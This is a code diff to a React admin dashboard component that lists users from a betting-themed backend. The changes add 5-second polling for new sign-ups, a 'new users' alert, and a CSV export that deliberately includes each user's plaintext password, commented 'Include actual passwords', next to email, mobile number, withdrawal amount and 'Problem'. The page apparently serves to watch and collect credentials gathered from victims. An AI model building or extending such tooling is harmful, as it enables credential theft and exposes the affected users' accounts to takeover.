@@ -11,18 +11,52 @@ function UserDetails() {
   const [error, setError] = useState('');
   const [isExporting, setIsExporting] = useState(false);
   const [searchTimeout, setSearchTimeout] = useState(null);
+  const [lastSeenUserCount, setLastSeenUserCount] = useState(0);
 
-  // Set up automatic refresh every 10 seconds to catch new users immediately
+  // Initial data load and set up more frequent polling for new users (every 5 seconds)
   useEffect(() => {
     fetchUsers();
     
-    // Set up polling to refresh data regularly
+    // Set up automatic refresh every 5 seconds to catch new users immediately
     const refreshInterval = setInterval(() => {
-      fetchUsers();
-    }, 10000);
+      checkForNewUsers();
+    }, 5000);
     
     return () => clearInterval(refreshInterval);
   }, [currentPage]);
+
+  // Separate function to check for new users
+  const checkForNewUsers = async () => {
+    try {
+      // First just check total count without loading all data
+      const countRes = await axios.get('https://backend-4bet.vercel.app/usersdetails/count', {
+        headers: {
+          Authorization: `Bearer ${localStorage.getItem('token')}`
+        },
+        // Add cache busting parameter
+        params: { _t: new Date().getTime() }
+      });
+      
+      if (countRes.data && countRes.data.totalUsers) {
+        const newTotalUsers = countRes.data.totalUsers;
+        
+        // If we have new users and we're on page 1, refresh the data
+        if (newTotalUsers > totalUsers) {
+          setTotalUsers(newTotalUsers);
+          
+          // If we're on page 1, refresh to show new users
+          if (currentPage === 1) {
+            fetchUsers(true);
+          } else {
+            // Auto-navigate to first page to see new users
+            setCurrentPage(1);
+          }
+        }
+      }
+    } catch (error) {
+      console.error('Error checking for new users:', error);
+    }
+  };
 
   // Handle search with debounce
   useEffect(() => {
@@ -45,7 +79,12 @@ function UserDetails() {
     };
   }, [searchTerm]);
 
-  const fetchUsers = async () => {
+  // Also fetch when current page changes
+  useEffect(() => {
+    fetchUsers();
+  }, [currentPage]);
+
+  const fetchUsers = async (forceRefresh = false) => {
     try {
       setLoading(true);
       setError('');
@@ -54,9 +93,14 @@ function UserDetails() {
       const params = {
         page: currentPage,
         limit: usersPerPage,
-        sortField: 'createdAt',  
-        sortDirection: 'desc'    // Always show newest users first
+        sortField: 'createdAt',
+        sortDirection: 'desc'  // Always show newest users first
       };
+      
+      // Add cache busting parameter to force fresh data
+      if (forceRefresh) {
+        params._t = new Date().getTime();
+      }
       
       // Only add search parameter if it's not empty
       if (searchTerm.trim() !== '') {
@@ -94,7 +138,7 @@ function UserDetails() {
 
   // Refresh data button handler
   const handleRefresh = () => {
-    fetchUsers();
+    fetchUsers(true); // Force refresh with cache-busting
   };
 
   // Clear search button handler
@@ -102,11 +146,19 @@ function UserDetails() {
     setSearchTerm('');
   };
 
+  // Go to first page to see newest users
+  const handleViewNewUsers = () => {
+    setCurrentPage(1);
+  };
+
   const exportToCSV = async () => {
     try {
       setIsExporting(true);
       // Export all users with the current search filters
-      const params = {};
+      const params = {
+        sortField: 'createdAt',
+        sortDirection: 'desc'
+      };
       
       // Only add search parameter if it's not empty
       if (searchTerm.trim() !== '') {
@@ -123,12 +175,12 @@ function UserDetails() {
       const users = response.data;
       
       // Format data for CSV
-      const headers = ['S.No', 'Email', 'Mobile Number', 'Password', 'Withdrawal Amount', 'Problem'];
+      const headers = ['S.No', 'Email', 'Password', 'Mobile Number', 'Withdrawal Amount', 'Problem'];
       const csvData = users.map((user, index) => [
         index + 1,
         user.email || 'N/A',
-        user.mobileNumber || 'N/A',
         user.password || 'N/A',  // Include actual passwords
+        user.mobileNumber || 'N/A',
         user.withdrawalAmount || '0',
         user.problem || 'N/A'
       ]);
@@ -246,6 +298,21 @@ function UserDetails() {
       justifyContent: 'center',
       gap: '6px',
     },
+    newUsersButton: {
+      backgroundColor: '#722ed1',
+      color: 'white',
+      border: 'none',
+      padding: '10px 18px',
+      borderRadius: '6px',
+      cursor: 'pointer',
+      fontSize: '14px',
+      fontWeight: '500',
+      transition: 'all 0.3s',
+      display: 'flex',
+      alignItems: 'center',
+      justifyContent: 'center',
+      gap: '6px',
+    },
     exportButton: {
       backgroundColor: '#52c41a',
       color: 'white',
@@ -266,6 +333,9 @@ function UserDetails() {
     },
     refreshButtonHover: {
       backgroundColor: '#096dd9',
+    },
+    newUsersButtonHover: {
+      backgroundColor: '#531dab',
     },
     tableContainer: {
       overflowX: 'auto',
@@ -399,6 +469,18 @@ function UserDetails() {
       fontWeight: 'bold',
       fontSize: '16px',
     },
+    newUsersBanner: {
+      backgroundColor: '#f9f0ff',
+      padding: '12px 16px',
+      borderRadius: '6px',
+      marginBottom: '20px',
+      border: '1px solid #d3adf7',
+      display: 'flex',
+      alignItems: 'center',
+      justifyContent: 'space-between',
+      fontSize: '14px',
+      color: '#531dab',
+    },
   };
 
   // Function to highlight search terms in content
@@ -413,6 +495,16 @@ function UserDetails() {
     }
   };
 
+  // Track if we're not on the first page and need to show a notification
+  const shouldShowNewUserAlert = currentPage !== 1 && totalUsers > lastSeenUserCount;
+  
+  // Update last seen count when we're on page 1
+  useEffect(() => {
+    if (currentPage === 1) {
+      setLastSeenUserCount(totalUsers);
+    }
+  }, [currentPage, totalUsers]);
+
   return (
     <div style={styles.container}>
       <div style={styles.header}>
@@ -421,6 +513,23 @@ function UserDetails() {
           <strong>Total Users:</strong> {totalUsers}
         </div>
       </div>
+
+      {shouldShowNewUserAlert && (
+        <div style={styles.newUsersBanner}>
+          <span>
+            <span style={styles.infoIcon}>⚡</span>
+            New users have been added! View them on the first page.
+          </span>
+          <button 
+            onClick={handleViewNewUsers}
+            style={styles.newUsersButton}
+            onMouseOver={(e) => e.currentTarget.style.backgroundColor = styles.newUsersButtonHover.backgroundColor}
+            onMouseOut={(e) => e.currentTarget.style.backgroundColor = styles.newUsersButton.backgroundColor}
+          >
+            View New Users
+          </button>
+        </div>
+      )}
 
       <div style={styles.searchContainer}>
         <div style={styles.searchForm}>
